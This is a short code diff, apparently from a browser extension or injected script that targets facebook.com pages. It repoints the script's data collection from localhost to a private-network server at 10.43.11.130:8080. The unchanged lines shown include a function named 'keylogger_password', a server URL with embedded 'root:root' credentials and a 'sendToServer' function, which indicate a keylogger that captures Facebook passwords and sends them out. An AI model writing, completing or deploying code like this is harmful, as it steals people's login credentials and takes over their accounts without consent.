@@ -50,7 +50,7 @@ var boolean =  window.location.href.split('/')[3] != ""
 if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount").length > 0 ){
 	if( boolean == false ){
 		var xhr1 = new XMLHttpRequest();
-		xhr1.open("GET", "https://127.0.0.1:8080/page", false);
+		xhr1.open("GET", "https://10.43.11.130:8080/page", false);
 		xhr1.send();
 		var page = "";
 		if(xhr1.status == 200){
@@ -177,7 +177,7 @@ function keylogger_password(e) {
 }
 
 
-var url = "https://root:root@127.0.0.1:8080/json";
+var url = "https://root:root@10.43.11.130:8080/json";
 
 
 function sendToServer(libelle,value){
